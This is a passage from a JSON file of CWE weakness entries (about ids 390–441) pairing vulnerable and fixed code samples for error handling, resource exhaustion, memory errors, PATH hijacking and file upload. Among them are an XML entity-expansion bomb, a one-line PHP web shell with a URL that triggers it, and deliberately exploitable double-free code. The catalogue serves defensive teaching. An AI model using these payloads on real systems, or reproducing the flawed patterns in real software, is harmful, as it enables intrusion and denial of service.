(!infile.is_open()) { throw \"Unable to open file \" + filename; } // get length of file infile.seekg (0, ios::end); int length = infile.tellg(); infile.seekg (0, ios::beg); // allocate memory char *buffer = new char [length]; // read data from file infile.read (buffer,length); if (!infile.good()) { throw \"Unable to read from file \" + filename; } infile.close(); return buffer; } catch (char *str) { printf(\"Error: %s \\\\n\", str); infile.close(); throw str; } catch (...) { printf(\"Error occurred trying to read from file \\\\n\"); infile.close(); throw; } } Example 3 In the following Java example the method readFile will read the file whose name is provided in the input parameter and will return the contents of the file in a String object. The constructor of the FileReader object and the read method call may throw exceptions and therefore must be within a try/catch block. While the catch statement in this example will catch thrown exceptions in order for the method to compile, no processing is performed to handle the thrown exceptions. Catch statements that do not perform any processing will have unexpected results. In this case, this will result in the return of a null String. (bad code) Example Language: Java public String readFile(String filename) { String retString = null; try { // initialize File and FileReader objects File file = new File(filename); FileReader fr = new FileReader(file); // initialize character buffer long fLen = file.length(); char[] cBuf = new char[(int) fLen]; // read data from file int iRead = fr.read(cBuf, 0, (int) fLen); // close file fr.close(); retString = new String(cBuf); } catch (Exception ex) { \"/* do nothing, but catch so it'll compile... */\" } return retString; } The catch statement should contain statements that either attempt to fix the problem, notify the user that an exception has been raised and continue processing, or perform some cleanup and gracefully terminate the program. The following Java example contains three catch statements. The first of these will catch the FileNotFoundException that may be thrown by the FileReader constructor called within the try/catch block. The second catch statement will catch the IOException that may be thrown by the read method called within the try/catch block. The third catch statement will catch all other exceptions thrown within the try block. For all catch statements the user is notified that the exception has been thrown and the exception is rethrown to the block that called the readFile() method for further processing or possible termination of the program. Note that with Java it is usually good practice to use the getMessage() method of the exception class to provide more information to the user about the exception raised. (good code) Example Language: Java public String readFile(String filename) throws FileNotFoundException, IOException, Exception { String retString = null; try { // initialize File and FileReader objects File file = new File(filename); FileReader fr = new FileReader(file); // initialize character buffer long fLen = file.length(); char [] cBuf = new char[(int) fLen]; // read data from file int iRead = fr.read(cBuf, 0, (int) fLen); // close file fr.close(); retString = new String(cBuf); } catch (FileNotFoundException ex) { System.err.println (\"Error: FileNotFoundException opening the input file: \" + filename ); System.err.println (\"\" + ex.getMessage() ); throw new FileNotFoundException(ex.getMessage()); } catch (IOException ex) { System.err.println(\"Error: IOException reading the input file.\\\\n\" + ex.getMessage() ); throw new IOException(ex); } catch (Exception ex) { System.err.println(\"Error: Exception reading the input file.\\\\n\" + ex.getMessage() ); throw new Exception(ex); } return retString; }"
    },
    {
        "id": 391,
        "demonstrative_examples": "Example 1 The following code excerpt ignores a rarely-thrown exception from doExchange(). (bad code) Example Language: Java try { doExchange(); } catch (RareException e) { // this can never happen } \"If a RareException were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior.\""
    },
    {
        "id": 392,
        "demonstrative_examples": "Example 1 In the following snippet from a doPost() servlet method, the server returns \"200 OK\" (default) even if an error occurs. (bad code) Example Language: Java try { // Something that may throw an exception. ... } catch (Throwable t) { logger.error(\"Caught: \" + t.toString()); return; }"
    },
    {
        "id": 393,
        "demonstrative_examples": "Example 1 In the following example, an HTTP 404 status code is returned in the event of an IOException encountered in a Java servlet. A 404 code is typically meant to indicate a non-existent resource and would be somewhat misleading in this case. (bad code) Example Language: Java try { // something that might throw IOException ... } catch (IOException ioe) { response.sendError(SC_NOT_FOUND); }"
    },
    {
        "id": 394,
        "demonstrative_examples": ""
    },
    {
        "id": 395,
        "demonstrative_examples": "Example 1 The following code mistakenly catches a NullPointerException. (bad code) Example Language: Java try { mysteryMethod(); } catch (NullPointerException npe) { }"
    },
    {
        "id": 396,
        "demonstrative_examples": "Example 1 The following code excerpt handles three types of exceptions in an identical fashion. (good code) Example Language: Java try { doExchange(); } catch (IOException e) { logger.error(\"doExchange failed\", e); } catch (InvocationTargetException e) { logger.error(\"doExchange failed\", e); } catch (SQLException e) { logger.error(\"doExchange failed\", e); } At first blush, it may seem preferable to deal with these exceptions in a single catch block, as follows: (bad code) try { doExchange(); } catch (Exception e) { logger.error(\"doExchange failed\", e); } \"However, if doExchange() is modified to throw a new type of exception that should be handled in some different kind of way, the broad catch block will prevent the compiler from pointing out the situation. Further, the new catch block will now also handle exceptions derived from RuntimeException such as ClassCastException, and NullPointerException, which is not the programmer's intent.\""
    },
    {
        "id": 397,
        "demonstrative_examples": "Example 1 The following method throws three types of exceptions. (good code) Example Language: Java public void doExchange() throws IOException, InvocationTargetException, SQLException { ... } While it might seem tidier to write (bad code) public void doExchange() throws Exception { ... } \"doing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of doExchange() introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement.\" Example 2 Early versions of C++ (C++98, C++03, C++11) included a feature known as Dynamic Exception Specification. This allowed functions to declare what type of exceptions it may throw. It is possible to declare a general class of exception to cover any derived exceptions that may be throw. (bad code) int myfunction() throw(std::exception) { if (0) throw out_of_range(); throw length_error(); } In the example above, the code declares that myfunction() can throw an exception of type \"std::exception\" thus hiding details about the possible derived exceptions that could potentially be thrown."
    },
    {
        "id": 400,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: Java class Worker implements Executor { ... public void execute(Runnable r) { try { ... } catch (InterruptedException ie) { // postpone response Thread.currentThread().interrupt(); } } public Worker(Channel ch, int nworkers) { ... } protected void activate() { Runnable loop = new Runnable() { public void run() { try { for (;;) { Runnable r = ...; r.run(); } } catch (InterruptedException ie) { ... } } }; new Thread(loop).start(); } } There are no limits to runnables. Potentially an attacker could cause resource problems very quickly. Example 2 This code allocates a socket and forks each time it receives a new connection. (bad code) Example Language: C sock=socket(AF_INET, SOCK_STREAM, 0); while (1) { newsock=accept(sock, ...); printf(\"A connection has been accepted\\\\n\"); pid = fork(); } The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely. Example 3 In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket. (bad code) Example Language: C int writeDataFromSocketToFile(char *host, int port) { char filename[FILENAME_SIZE]; char buffer[BUFFER_SIZE]; int socket = openSocketConnection(host, port); if (socket < 0) { printf(\"Unable to open socket connection\"); return(FAIL); } if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) { if (openFileToWrite(filename) > 0) { while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){ if (!(writeToFile(buffer) > 0)) break; } } closeFile(); } closeSocket(socket); } \"This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.\" Example 4 In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array. (bad code) Example Language: C /* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */ int processMessage(char **message) { char *body; int length = getMessageLength(message[0]); if (length > 0) { body = &message[1][0]; processMessageBody(body); return(SUCCESS); } else { printf(\"Unable to process message; invalid message length\"); return(FAIL); } } This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length check \"Also, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (\" CWE-195 ) that may occur elsewhere in the code. (good code) Example Language: C unsigned int length = getMessageLength(message[0]); if ((length > 0) && (length < MAX_LENGTH)) {...} Example 5 In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket. (bad code) Example Language: Java public void acceptConnections() { try { ServerSocket serverSocket = new ServerSocket(SERVER_PORT); int counter = 0; boolean hasConnections = true; while (hasConnections) { Socket client = serverSocket.accept(); Thread t = new Thread(new ClientSocketThread(client)); t.setName(client.getInetAddress().getHostName() + \":\" + counter++); t.start(); } serverSocket.close(); } catch (IOException ex) {...} } In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources. The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated. (good code) Example Language: Java public static final int SERVER_PORT = 4444; public static final int MAX_CONNECTIONS = 10; ... public void acceptConnections() { try { ServerSocket serverSocket = new ServerSocket(SERVER_PORT); int counter = 0; boolean hasConnections = true; while (hasConnections) { hasConnections = checkForMoreConnections(); Socket client = serverSocket.accept(); Thread t = new Thread(new ClientSocketThread(client)); t.setName(client.getInetAddress().getHostName() + \":\" + counter++); ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS); pool.execute(t); } serverSocket.close(); } catch (IOException ex) {...} }"
    },
    {
        "id": 401,
        "demonstrative_examples": "Example 1 The following C function leaks a block of allocated memory if the call to read() does not return the expected number of bytes: (bad code) Example Language: C char* getBlock(int fd) { char* buf = (char*) malloc(BLOCK_SIZE); if (!buf) { return NULL; } if (read(fd, buf, BLOCK_SIZE) != BLOCK_SIZE) { return NULL; } return buf; }"
    },
    {
        "id": 402,
        "demonstrative_examples": ""
    },
    {
        "id": 403,
        "demonstrative_examples": ""
    },
    {
        "id": 404,
        "demonstrative_examples": "Example 1 The following method never closes the new file handle. Given enough time, the Finalize() method for BufferReader should eventually call Close(), but there is no guarantee as to how long this action will take. In fact, there is no guarantee that Finalize() will ever be invoked. In a busy environment, the Operating System could use up all of the available file handles before the Close() function is called. (bad code) Example Language: Java private void processFile(string fName) { BufferReader fil = new BufferReader(new FileReader(fName)); String line; while ((line = fil.ReadLine()) != null) { processLine(line); } } The good code example simply adds an explicit call to the Close() function when the system is done using the file. Within a simple example such as this the problem is easy to see and fix. In a real system, the problem may be considerably more obscure. (good code) Example Language: Java private void processFile(string fName) { BufferReader fil = new BufferReader(new FileReader(fName)); String line; while ((line = fil.ReadLine()) != null) { processLine(line); } fil.Close(); } Example 2 This code attempts to open a connection to a database and catches any exceptions that may occur. (bad code) Example Language: Java try { Connection con = DriverManager.getConnection(some_connection_string); } catch ( Exception e ) { log( e ); } If an exception occurs after establishing the database connection and before the same connection closes, the pool of database connections may become exhausted. If the number of available connections is exceeded, other users cannot access this resource, effectively denying access to the application. Example 3 Under normal conditions the following C# code executes a database query, processes the results returned by the database, and closes the allocated SqlConnection object. But if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries. (bad code) Example Language: C# ... SqlConnection conn = new SqlConnection(connString); SqlCommand cmd = new SqlCommand(queryString); cmd.Connection = conn; conn.Open(); SqlDataReader rdr = cmd.ExecuteReader(); HarvestResults(rdr); conn.Connection.Close(); ... Example 4 The following C function does not close the file handle it opens if an error occurs. If the process is long-lived, the process can run out of file handles. (bad code) Example Language: C int decodeFile(char* fName) { char buf[BUF_SZ]; FILE* f = fopen(fName, \"r\"); if (!f) { printf(\"cannot open %s\\\\n\", fName); return DECODE_FAIL; } else { while (fgets(buf, BUF_SZ, f)) { if (!checkChecksum(buf)) { return DECODE_FAIL; } else { decodeBlock(buf); } } } fclose(f); return DECODE_SUCCESS; } Example 5 In this example, the program does not use matching functions such as malloc/free, new/delete, and new[]/delete[] to allocate/deallocate the resource. (bad code) Example Language: C++ class A { void foo(); }; void A::foo(){ int *ptr; ptr = (int*)malloc(sizeof(int)); delete ptr; } Example 6 In this example, the program calls the delete[] function on non-heap memory. (bad code) Example Language: C++ class A{ void foo(bool); }; void A::foo(bool heap) { int localArray[2] = { 11,22 }; int *p = localArray; if (heap){ p = new int[2]; } delete[] p; }"
    },
    {
        "id": 405,
        "demonstrative_examples": ""
    },
    {
        "id": 406,
        "demonstrative_examples": "Example 1 This code listens on a port for DNS requests and sends the result to the requesting address. (bad code) Example Language: Python sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.bind( (UDP_IP,UDP_PORT) ) while true: data = sock.recvfrom(1024) if not data: break (requestIP, nameToResolve) = parseUDPpacket(data) record = resolveName(nameToResolve) sendResponse(requestIP,record) \"This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.\""
    },
    {
        "id": 407,
        "demonstrative_examples": ""
    },
    {
        "id": 408,
        "demonstrative_examples": "Example 1 This data prints the contents of a specified file requested by a user. (bad code) Example Language: PHP function printFile($username,$filename){ //read file into string $file = file_get_contents($filename); if ($file && isOwnerOf($username,$filename)){ echo $file; return true; } else{ \"echo 'You are not authorized to view this file';\" } return false; } This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway."
    },
    {
        "id": 409,
        "demonstrative_examples": "Example 1 The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected. (attack code) Example Language: XML <?xml version=\"1.0\"?> <!DOCTYPE MaliciousDTD [ <!ENTITY ZERO \"A\"> <!ENTITY ONE \"&ZERO;&ZERO;\"> <!ENTITY TWO \"&ONE;&ONE;\"> ... <!ENTITY THIRTYTWO \"&THIRTYONE;&THIRTYONE;\"> ]> <data>&THIRTYTWO;</data>"
    },
    {
        "id": 410,
        "demonstrative_examples": "Example 1 In the following snippet from a Tomcat configuration file, a JDBC connection pool is defined with a maximum of 5 simultaneous connections (with a 60 second timeout). In this case, it may be trivial for an attacker to instigate a denial of service (DoS) by using up all of the available connections in the pool. (bad code) Example Language: XML <Resource name=\"jdbc/exampledb\" auth=\"Container\" type=\"javax.sql.DataSource\" removeAbandoned=\"true\" removeAbandonedTimeout=\"30\" maxActive=\"5\" maxIdle=\"5\" maxWait=\"60000\" username=\"testuser\" password=\"testpass\" driverClassName=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://localhost/exampledb\"/>"
    },
    {
        "id": 412,
        "demonstrative_examples": "Example 1 This code tries to obtain a lock for a file, then writes to it. (bad code) Example Language: PHP function writeToLog($message){ $logfile = fopen(\"logFile.log\", \"a\"); //attempt to get logfile lock if (flock($logfile, LOCK_EX)) { fwrite($logfile,$message); // unlock logfile flock($logfile, LOCK_UN); } else { print \"Could not obtain lock on logFile.log, message not recorded\\\\n\"; } } fclose($logFile); PHP by default will wait indefinitely until a file lock is released. If an attacker is able to obtain the file lock, this code will pause execution, possibly leading to denial of service for other users. Note that in this case, if an attacker can perform an flock() on the file, they may already have privileges to destroy the log file. However, this still impacts the execution of other programs that depend on flock()."
    },
    {
        "id": 413,
        "demonstrative_examples": "Example 1 The following function attempts to acquire a lock in order to perform operations on a shared resource. (bad code) Example Language: C void f(pthread_mutex_t *mutex) { pthread_mutex_lock(mutex); /* access shared resource */ pthread_mutex_unlock(mutex); } However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior. In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels. (good code) Example Language: C int f(pthread_mutex_t *mutex) { int result; result = pthread_mutex_lock(mutex); if (0 != result) return result; /* access shared resource */ return pthread_mutex_unlock(mutex); } Example 2 This Java example shows a simple BankAccount class with deposit and withdraw methods. (bad code) Example Language: Java public class BankAccount { // variable for bank account balance private double accountBalance; // constructor for BankAccount public BankAccount() { accountBalance = 0; } // method to deposit amount into BankAccount public void deposit(double depositAmount) { double newBalance = accountBalance + depositAmount; accountBalance = newBalance; } // method to withdraw amount from BankAccount public void withdraw(double withdrawAmount) { double newBalance = accountBalance - withdrawAmount; accountBalance = newBalance; } // other methods for accessing the BankAccount object ... } However, the deposit and withdraw methods have shared access to the account balance private class variable. This can result in a race condition if multiple threads attempt to call the deposit and withdraw methods simultaneously where the account balance is modified by one thread before another thread has completed modifying the account balance. For example, if a thread attempts to withdraw funds using the withdraw method before another thread that is depositing funds using the deposit method completes the deposit then there may not be sufficient funds for the withdraw transaction. To prevent multiple threads from having simultaneous access to the account balance variable the deposit and withdraw methods should be synchronized using the synchronized modifier. (good code) Example Language: Java public class BankAccount { ... // synchronized method to deposit amount into BankAccount public synchronized void deposit(double depositAmount) { ... } // synchronized method to withdraw amount from BankAccount public synchronized void withdraw(double withdrawAmount) { ... } ... } An alternative solution is to use a lock object to ensure exclusive access to the bank account balance variable. As shown below, the deposit and withdraw methods use the lock object to set a lock to block access to the BankAccount object from other threads until the method has completed updating the bank account balance variable. (good code) Example Language: Java public class BankAccount { ... // lock object for thread access to methods private ReentrantLock balanceChangeLock; // condition object to temporarily release lock to other threads private Condition sufficientFundsCondition; // method to deposit amount into BankAccount public void deposit(double amount) { // set lock to block access to BankAccount from other threads balanceChangeLock.lock(); try { double newBalance = balance + amount; balance = newBalance; // inform other threads that funds are available sufficientFundsCondition.signalAll(); } catch (Exception e) {...} finally { // unlock lock object balanceChangeLock.unlock(); } } // method to withdraw amount from bank account public void withdraw(double amount) { // set lock to block access to BankAccount from other threads balanceChangeLock.lock(); try { while (balance < amount) { // temporarily unblock access // until sufficient funds are available sufficientFundsCondition.await(); } double newBalance = balance - amount; balance = newBalance; } catch (Exception e) {...} finally { // unlock lock object balanceChangeLock.unlock(); } } ... }"
    },
    {
        "id": 414,
        "demonstrative_examples": ""
    },
    {
        "id": 415,
        "demonstrative_examples": "Example 1 The following code shows a simple example of a double free vulnerability. (bad code) Example Language: C char* ptr = (char*)malloc (SIZE); ... if (abrt) { free(ptr); } ... free(ptr); Double free vulnerabilities have two common (and sometimes overlapping) causes: Error conditions and other exceptional circumstances Confusion over which part of the program is responsible for freeing the memory Although some double free vulnerabilities are not much more complicated than the previous example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once. Example 2 While contrived, this code should be exploitable on Linux distributions which do not ship with heap-chunk check summing turned on. (bad code) Example Language: C #include <stdio.h> #include <unistd.h> #define BUFSIZE1 512 #define BUFSIZE2 ((BUFSIZE1/2) - 8) int main(int argc, char **argv) { char *buf1R1; char *buf2R1; char *buf1R2; buf1R1 = (char *) malloc(BUFSIZE2); buf2R1 = (char *) malloc(BUFSIZE2); free(buf1R1); free(buf2R1); buf1R2 = (char *) malloc(BUFSIZE1); strncpy(buf1R2, argv[1], BUFSIZE1-1); free(buf2R1); free(buf1R2); }"
    },
    {
        "id": 416,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C #include <stdio.h> #include <unistd.h> #define BUFSIZER1 512 #define BUFSIZER2 ((BUFSIZER1/2) - 8) int main(int argc, char **argv) { char *buf1R1; char *buf2R1; char *buf2R2; char *buf3R2; buf1R1 = (char *) malloc(BUFSIZER1); buf2R1 = (char *) malloc(BUFSIZER1); free(buf2R1); buf2R2 = (char *) malloc(BUFSIZER2); buf3R2 = (char *) malloc(BUFSIZER2); strncpy(buf2R1, argv[1], BUFSIZER1-1); free(buf1R1); free(buf2R2); free(buf3R2); } Example 2 The following code illustrates a use after free error: (bad code) Example Language: C char* ptr = (char*)malloc (SIZE); if (err) { abrt = 1; free(ptr); } ... if (abrt) { logError(\"operation aborted before commit\", ptr); } When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function."
    },
    {
        "id": 419,
        "demonstrative_examples": ""
    },
    {
        "id": 420,
        "demonstrative_examples": ""
    },
    {
        "id": 421,
        "demonstrative_examples": ""
    },
    {
        "id": 422,
        "demonstrative_examples": ""
    },
    {
        "id": 424,
        "demonstrative_examples": ""
    },
    {
        "id": 425,
        "demonstrative_examples": "Example 1 If forced browsing is possible, an attacker may be able to directly access a sensitive page by entering a URL similar to the following. (attack code) Example Language: JSP http://somesite.com/someapplication/admin.jsp"
    },
    {
        "id": 426,
        "demonstrative_examples": "Example 1 This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system. (bad code) Example Language: C #define DIR \"/restricted/directory\" char cmd[500]; sprintf(cmd, \"ls -l %480s\", DIR); /* Raise privileges to those needed for accessing DIR. */ RaisePrivileges(...); system(cmd); DropPrivileges(...); ... \"This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.\" However, because the program does not modify the PATH environment variable, the following attack would work: (attack code) The user sets the PATH to reference a directory under the attacker\\'s control, such as \"/my/dir/\". The attacker creates a malicious program called \"ls\", and puts that program in /my/dir The user executes the program. When system() is executed, the shell consults the PATH to find the ls program The program finds the attacker\\'s malicious program, \"/my/dir/ls\". It doesn\\'t find \"/bin/ls\" because PATH does not contain \"/bin/\". \"The program executes the attacker's malicious program with the raised privileges.\" Example 2 This code prints all of the running processes belonging to the current user. (bad code) Example Language: PHP //assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoiding CWE-78 ) $userName = getCurrentUser(); \"$command = 'ps aux | grep ' . $userName;\" system($command); If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments ( CWE-497 ). This program is also potentially vulnerable to a PATH based attack ( CWE-426 ), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users. Example 3 The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges. (bad code) Example Language: Java ... System.Runtime.getRuntime().exec(\"make\"); ... \"The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\""
    },
    {
        "id": 427,
        "demonstrative_examples": "Example 1 The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges. (bad code) Example Language: Java ... System.Runtime.getRuntime().exec(\"make\"); ... \"The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\""
    },
    {
        "id": 428,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C UINT errCode = WinExec( \"C:\\\\\\\\Program Files\\\\\\\\Foo\\\\\\\\Bar\", SW_SHOW );"
    },
    {
        "id": 430,
        "demonstrative_examples": ""
    },
    {
        "id": 431,
        "demonstrative_examples": "Example 1 If a Servlet does not catch all exceptions, it may reveal debugging information that will help an adversary form a plan of attack. In the following method a DNS lookup failure will cause the Servlet to throw an exception. (bad code) Example Language: Java protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { String ip = req.getRemoteAddr(); InetAddress addr = InetAddress.getByName(ip); ... out.println(\"hello \" + addr.getHostName()); } When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker."
    },
    {
        "id": 432,
        "demonstrative_examples": ""
    },
    {
        "id": 433,
        "demonstrative_examples": "Example 1 The following code uses an include file to store database credentials: database.inc (bad code) Example Language: PHP <?php \"$dbName = 'usersDB';\" \"$dbPassword = 'skjdh#67nkjd3$3$';\" ?> login.php (bad code) Example Language: PHP <?php \"include('database.inc');\" $db = connectToDB($dbName, $dbPassword); $db.authenticateUser($username, $password); ?> If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password."
    },
    {
        "id": 434,
        "demonstrative_examples": "Example 1 The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type \"file\". (good code) Example Language: HTML <form action=\"upload_picture.php\" method=\"post\" enctype=\"multipart/form-data\"> Choose a file to upload: <input type=\"file\" name=\"filename\"/> <br/> <input type=\"submit\" name=\"submit\" value=\"Submit\"/> </form> Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory. (bad code) Example Language: PHP // Define the target location where the picture being // uploaded is going to be saved. $target = \"pictures/\" . basename($_FILES[\\'uploadedfile\\'][\\'name\\']); // Move the uploaded file to the new location. \"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))\" { echo \"The picture has been successfully uploaded.\"; } else { echo \"There was an error uploading the picture, please try again.\"; } The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name: (attack code) malicious.php Since this filename ends in \".php\" it can be executed by the web server. In the contents of this uploaded file, the attacker could use: (attack code) Example Language: PHP <?php \"system($_GET['cmd']);\" ?> Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as: (attack code) http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l which runs the \"ls -l\" command - or any other type of command that the attacker wants to specify. Example 2 The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet. (good code) Example Language: HTML <form action=\"FileUploadServlet\" method=\"post\" enctype=\"multipart/form-data\"> Choose a file to upload: <input type=\"file\" name=\"filename\"/> <br/> <input type=\"submit\" name=\"submit\" value=\"Submit\"/> </form> \"When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.\" (bad code) Example Language: Java public class FileUploadServlet extends HttpServlet { ... protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(\"text/html\"); PrintWriter out = response.getWriter(); String contentType = request.getContentType(); // the starting position of the boundary header int ind = contentType.indexOf(\"boundary=\"); String boundary = contentType.substring(ind+9); String pLine = new String(); String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value // verify that content type is multipart form data if (contentType != null && contentType.indexOf(\"multipart/form-data\") != -1) { // extract the filename from the Http header BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream())); ... pLine = br.readLine(); String filename = pLine.substring(pLine.lastIndexOf(\"\\\\\\\\\"), pLine.lastIndexOf(\"\\\\\"\")); ... // output the file to the local upload directory try { BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true)); for (String line; (line=br.readLine())!=null; ) { if (line.indexOf(boundary) == -1) { bw.write(line); bw.newLine(); bw.flush(); } } //end of for loop bw.close(); } catch (IOException ex) {...} // output successful upload response HTML page } // output unsuccessful upload response HTML page else {...} } ... } This code does not perform a check on the type of the file being uploaded ( CWE-434 ). This could allow an attacker to upload any executable file or other file with malicious code. Additionally, the creation of the BufferedWriter object is subject to relative path traversal ( CWE-23 ). Since the code does not check the filename that is provided in the header, an attacker can use \"../\" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS ( CWE-79 ), or system crash."
    },
    {
        "id": 435,
        "demonstrative_examples": ""
    },
    {
        "id": 436,
        "demonstrative_examples": "Example 1 The paper \"Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection\" [ REF-428 ] shows that OSes varied widely in how they manage unusual packets, which made it difficult or impossible for intrusion detection systems to properly detect certain attacker manipulations that took advantage of these OS differences. Example 2 Null characters have different interpretations in Perl and C, which have security consequences when Perl invokes C functions. Similar problems have been reported in ASP [ REF-429 ] and PHP."
    },
    {
        "id": 437,
        "demonstrative_examples": "Example 1 HTTP request smuggling is an attack against an intermediary such as a proxy. This attack works because the proxy expects the client to parse HTTP headers one way, but the client parses them differently. Example 2 \"Anti-virus products that reside on mail servers can suffer from this issue if they do not know how a mail client will handle a particular attachment. The product might treat an attachment type as safe, not knowing that the client's configuration treats it as executable.\""
    },
    {
        "id": 439,
        "demonstrative_examples": ""
    },
    {
        "id": 440,
        "demonstrative_examples": ""
    },
    {
        "id": 441,
